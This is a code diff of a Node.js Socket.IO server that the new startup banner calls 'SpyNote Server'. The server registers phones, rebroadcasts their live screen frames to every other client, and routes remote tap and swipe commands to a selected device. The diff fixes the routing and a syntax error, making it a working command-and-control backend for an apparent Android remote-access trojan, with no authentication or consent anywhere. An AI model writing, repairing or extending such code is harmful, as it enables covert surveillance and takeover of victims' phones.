@@ -1,7 +1,7 @@
 const express = require('express');
 const http = require('http');
 const socketIo = require('socket.io');
-const path = require(path);
+const path = require('path');
 const compression = require('compression');
 
 const app = express();
@@ -19,7 +19,7 @@ app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ limit: '100mb', extended: true }));
 
 const devices = new Map();
-const deviceSockets = new Map(); // Track device -> socket mapping
+const deviceSockets = new Map();
 
 app.post('/register', (req, res) => {
     const { deviceId, model, brand, version, status } = req.body;
@@ -36,65 +36,69 @@ app.get('/devices', (req, res) => {
 });
 
 io.on('connection', (socket) => {
-    console.log('🔌 Socket connected:', socket.id);
+    console.log('🔌 Client connected:', socket.id);
 
-    // 🔥 DEVICE REGISTRATION - Track socket properly
     socket.on('register-device', (deviceInfo) => {
         const deviceId = deviceInfo.deviceId;
-        console.log('📱 Device register:', deviceId);
-        
         if (deviceId) {
             devices.set(deviceId, { 
                 ...deviceInfo, 
                 connected: true, 
                 socketId: socket.id 
             });
-            deviceSockets.set(deviceId, socket); // 🔥 DIRECT SOCKET REFERENCE
-            socket.join(deviceId);
+            deviceSockets.set(deviceId, socket.id);
+            socket.join(deviceId); // ✅ Device joins its own room
             io.emit('devices-update', Array.from(devices.entries()));
-            console.log(`✅ Device ${deviceId} → Socket ${socket.id}`);
+            console.log("📱 Device registered:", deviceId, "Socket:", socket.id);
         }
     });
 
-    // ✅ SCREEN STREAMING
+    // ✅ SCREEN STREAMING - Broadcast to ALL clients
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
-        socket.broadcast.emit('screen-update', data);
+        console.log('📺 Frame from:', deviceId);
+        
+        if (devices.has(deviceId)) {
+            socket.broadcast.emit('screen-update', {
+                deviceId,
+                data: data.data,
+                width: data.width,
+                height: data.height,
+                timestamp: data.timestamp
+            });
+        }
     });
 
-    // 🔥 CONTROL COMMANDS - FIXED 100%
+    // 🔥 FIXED CONTROL COMMANDS - Direct to device room
     socket.on('control', (data) => {
         const { deviceId, action, x, y, startX, startY, endX, endY } = data;
-        console.log(`🎮 CONTROL [${deviceId}] ${action}`, {x,y,startX,startY,endX,endY});
+        console.log('🎮 CONTROL ->', deviceId, ':', action, {x,y,startX,startY,endX,endY});
         
-        const deviceSocket = deviceSockets.get(deviceId);
-        if (deviceSocket) {
-            // ✅ DIRECT SOCKET EMIT + ROOM EMIT (DOUBLE SURE)
-            deviceSocket.emit('control', {
-                action, x: parseFloat(x)||0, y: parseFloat(y)||0,
-                startX: parseFloat(startX)||0, startY: parseFloat(startY)||0,
-                endX: parseFloat(endX)||0, endY: parseFloat(endY)||0
-            });
+        if (devices.has(deviceId)) {
+            // ✅ CRITICAL FIX: Send to DEVICE ROOM (not just socket)
             io.to(deviceId).emit('control', {
-                action, x: parseFloat(x)||0, y: parseFloat(y)||0,
-                startX: parseFloat(startX)||0, startY: parseFloat(startY)||0,
-                endX: parseFloat(endX)||0, endY: parseFloat(endY)||0
+                action, 
+                x: parseFloat(x) || 0, 
+                y: parseFloat(y) || 0,
+                startX: parseFloat(startX) || 0, 
+                startY: parseFloat(startY) || 0,
+                endX: parseFloat(endX) || 0, 
+                endY: parseFloat(endY) || 0
             });
-            console.log(`✅ SENT to ${deviceId} (${deviceSocket.id})`);
+            console.log('✅ Control sent to device room:', deviceId);
         } else {
-            console.log(`❌ Device socket not found: ${deviceId}`);
+            console.log('❌ Device not found:', deviceId);
         }
     });
 
     socket.on('disconnect', () => {
-        console.log('🔌 Socket disconnected:', socket.id);
-        // Cleanup device mapping
-        for (const [deviceId, deviceSocket] of deviceSockets.entries()) {
-            if (deviceSocket.id === socket.id) {
-                devices.set(deviceId, { ...devices.get(deviceId), connected: false });
+        console.log('🔌 Client disconnected:', socket.id);
+        for (const [deviceId, info] of devices.entries()) {
+            if (info.socketId === socket.id) {
+                devices.set(deviceId, { ...info, connected: false });
                 deviceSockets.delete(deviceId);
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log(`📴 Device disconnected: ${deviceId}`);
+                console.log('📱 Device disconnected:', deviceId);
                 break;
             }
         }
@@ -103,6 +107,6 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 Server: http://localhost:${PORT}`);
-    console.log(`✅ FULL CONTROL + SCREEN READY`);
+    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
+    console.log(`📱 Multi-device + FULL CONTROL ready!`);
 });
